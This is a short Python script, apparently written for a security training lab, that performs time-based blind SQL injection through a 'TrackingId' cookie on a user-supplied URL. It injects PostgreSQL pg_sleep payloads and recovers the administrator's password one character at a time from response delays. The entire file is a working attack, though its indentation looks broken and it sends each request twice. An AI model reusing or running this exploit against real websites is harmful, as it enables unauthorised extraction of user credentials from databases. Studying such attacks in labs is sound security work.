#Blind SQL injection with time delays and information retrieval
import requests
import time
import json

url = input("enter url : ")
r=requests.get(url)
cookies = r.cookies.get_dict()
TrackingId = cookies['TrackingId']
cookies['TrackingId'] = TrackingId+"'||pg_sleep(10)--"


Password = "password : "

for i in range(1,20) :
    for j in 'abcdefghijklmnopqrstuvwxyz0123456789':
              
              
     cookies['TrackingId'] = TrackingId+"'||(SELECT CASE WHEN SUBSTRING(password,"+str(i)+",1)='"+j+"' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'" 
     r=requests.get(url,cookies=cookies)
     start = time.time()
     r=requests.get(url,cookies=cookies)
     dely=time.time()-start
     if dely >=5.0 :
         Password=Password+j

print(Password)
